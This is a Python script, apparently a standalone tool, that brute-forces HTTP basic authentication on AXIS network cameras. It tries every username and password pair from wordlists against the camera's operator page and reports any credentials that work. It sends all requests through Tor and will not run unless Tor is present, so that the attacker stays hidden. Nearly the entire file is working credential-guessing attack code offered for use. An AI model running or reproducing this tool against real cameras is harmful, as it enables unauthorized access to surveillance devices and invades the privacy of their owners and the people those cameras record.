"""
TOR-Powered AXIS Cameras Checker

This script checks for HTTP basic authentication on AXIS cameras using a provided
URL and wordlists of usernames and passwords. It utilizes the Tor network for anonymity.

Usage:
    python script.py --url <URL> --usernames-wordlist <path_to_usernames_wordlist> --passwords-wordlist <path_to_passwords_wordlist>

Arguments:
    --url, -u:                  URL of the AXIS camera to check (e.g., http://10.0.0.1:8088)
    --usernames-wordlist, -uw:  Path to the file containing the list of usernames to try
    --passwords-wordlist, -pw:  Path to the file containing the list of passwords to try

Example:
    python script.py --url http://10.0.0.1:8088 --usernames-wordlist usernames.txt --passwords-wordlist passwords.txt

Dependencies:
    - termcolor: For colored console output
    - tqdm: For displaying progress bars
    - requests: For sending HTTP requests
    - urllib: For URL parsing

Note:
    - This script must be executed while connected to the Tor network.
"""

from termcolor import colored
from tqdm import tqdm
import argparse
import requests
import socket
import re
import os
import sys
import urllib.parse


def print_colored(text, color, attrs=[]):
    """
    Print colored text to the console.

    Args:
        text (str): The text to print.
        color (str): The color of the text. Available colors: grey, red, green, yellow, blue, magenta, cyan, and white.
        attrs (list): A list of attribute strings. Available attributes: bold, dark, underline, blink, reverse, concealed.
    """
    print(colored(text, color, attrs=attrs))


def credits():
    print(r"   _____         .__         ________  ________  ")
    print(r"  /  _  \ ___  __|__| ______/  _____/ /  _____/  ")
    print(r" /  /_\  \  \/  /  |/  ___/   \  ___/   \  ___   ")
    print(r"/    |    \>    <|  |\___ \\    \_\  \    \_\  \ ")
    print(r"\____|__  /__/\_ \__/____  >\______  /\______  / ")
    print(r"        \/      \/       \/        \/        \/  ")
    print_colored(r"               Made by Balzabu                   ", "green", ["blink","bold"])
    print(r"              https://balzabu.io                 ")


def is_connected_tor():
    """
    Check if the script is connected to the Tor network.

    Returns:
        bool: True if connected to Tor, False otherwise.
    """
    try:
        # Attempt to create a socket connection to TOR's SOCKS proxy
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)  # Set a timeout for the connection attempt
        s.connect(("127.0.0.1", 9050))  # Attempt to connect to TOR's SOCKS proxy on port 9050
        s.close()  # Close the socket connection
        return True  # If the connection succeeds, TOR is likely running on port 9050
    except Exception as e:
        return False  # If any exception occurs, TOR is either not running or not listening on port 9050


def read_wordlist(file_path):
    """
    Read a wordlist file from the specified path.

    Args:
        file_path (str): The path to the wordlist file.

    Returns:
        list: A list containing the words from the wordlist file.
    """
    if not os.path.isfile(file_path):
        print(f"Error: File '{file_path}' does not exist.")
        exit(1)

    # Redirect standard error to null device
    stderr_backup = os.dup(2)  # Backup the original standard error file descriptor
    os.close(2)  # Close the original standard error file descriptor
    os.open(os.devnull, os.O_WRONLY)  # Open null device and use it as standard error

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        wordlist = file.read().splitlines()

    # Restore standard error
    os.dup2(stderr_backup, 2)  # Restore the original standard error file descriptor

    return wordlist


def is_valid_url(url):
    """
    Check if a URL is valid.

    Args:
        url (str): The URL to validate.

    Returns:
        bool: True if the URL is valid, False otherwise.
    """

    try:
        result = urllib.parse.urlparse(url)
        return all([result.scheme, result.netloc]) and bool(re.match(r"^http[s]?://", url))
    except ValueError:
        return False


def validate_url(url):
    """
    Validate a URL.

    Args:
        url (str): The URL to validate.

    Returns:
        str: The validated URL.
    """

    if not url or not is_valid_url(url):
        print_colored("Invalid URL: URL must be a non-empty string and a valid URL.", "red", ["bold"])
        sys.exit()
    return url


def try_http_auth(url, username_wordlist, password_wordlist):
    """
    Try HTTP basic authentication using the provided username and password wordlists.

    Args:
        url (str): The base URL where authentication will be attempted.
        username_wordlist (list): A list of usernames to try.
        password_wordlist (list): A list of passwords to try.

    Returns:
        tuple: A tuple containing the username and password that successfully authenticated,
               or (None, None) if no valid credentials were found.
    """
    # Construct the full URL for the authentication page
    auth_url = urllib.parse.urljoin(url, '/operator/basic.shtml')

    # Calculate the total number of combinations to try
    total_combinations = len(username_wordlist) * len(password_wordlist)

    # Initialize the progress bar with dynamic ncols to show remaining time
    progress_bar = tqdm(total=total_combinations, desc="Testing Credentials", unit="combination", dynamic_ncols=True)

    # Initialize session for sending requests with Tor proxy
    session = requests.Session()
    session.proxies = {'http': 'socks5h://localhost:9050', 'https': 'socks5h://localhost:9050'}

    try:
        # Send a GET request to the URL to check if authentication is required
        response = session.get(auth_url, timeout=15)

        # Check if authentication is required (HTTP status code 401 and 'WWW-Authenticate' header)
        if response.status_code == 401 and 'WWW-Authenticate' in response.headers:
            # Iterate over each username and password combination
            for username in username_wordlist:
                for password in password_wordlist:
                    try:
                        # Add Basic Authentication headers with current username and password
                        session.auth = (username, password)

                        # Send a GET request to the URL with Basic Authentication headers
                        response = session.get(auth_url, timeout=15)

                        # Update the progress bar with the current username and password combination
                        progress_bar.set_postfix({"Username": username, "Password": password})
                        progress_bar.update(1)

                        # Check if the authentication was successful (HTTP status code 200)
                        if response.status_code == 200:
                            progress_bar.close()  # Close the progress bar
                            return username, password  # Return the successful credentials
                    except Exception as e:
                        print(f"{colored('Error:', 'red')} {e}")
        else:
            print("Authentication is not required for this URL.")
            progress_bar.close()  # Close the progress bar
            return None, None

    except Exception as e:
        print(f"{colored('Error:', 'red')} {e}")

    # If no valid credentials were found, close the progress bar and return None
    progress_bar.close()
    return None, None


def main(args):
    """
    The main function of the script.

    Args:
        args: The parsed command-line arguments.
    """
    if not validate_url(args.url):
        print_colored(f"Error: Invalid URL: {args.url}", "red", ["bold"])
        return

    if not args.usernames_wordlist:
        print_colored("Error: Username wordlist (-uw) is required.", "red", ["bold"])
        return

    if not args.passwords_wordlist:
        print_colored("Error: Password wordlist (-pw) is required.", "red", ["bold"])
        return

    username_wordlist = read_wordlist(args.usernames_wordlist)
    password_wordlist = read_wordlist(args.passwords_wordlist)

    credits()

    if not is_connected_tor():
        print_colored("This script must be executed while connected to TOR.", "red", ["bold"])
        print("Bye-bye!")
        sys.exit()

    # Call try_http_auth function to attempt authentication
    username, password = try_http_auth(args.url, username_wordlist, password_wordlist)

    if username and password:
        print_colored(f"""Valid credentials found --> {username}:{password}""", "green", ["bold"])
    else:
        print_colored("No valid credentials found.", "red", ["bold"])


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="TOR-Powered AXIS Cameras Checker")
    parser.add_argument("--url", "-u", help="URL to check (e.g., http://10.0.0.1:8088)")
    parser.add_argument("--usernames-wordlist", "-uw", help="Username wordlist")
    parser.add_argument("--passwords-wordlist", "-pw", help="Password wordlist")

    # Parse the known arguments and unrecognized arguments
    args, unknown_args = parser.parse_known_args()

    if unknown_args:
        print_colored(f"Unrecognized arguments: {unknown_args}", "red", ["bold"])
        parser.print_help()
        exit(1)

    main(args)
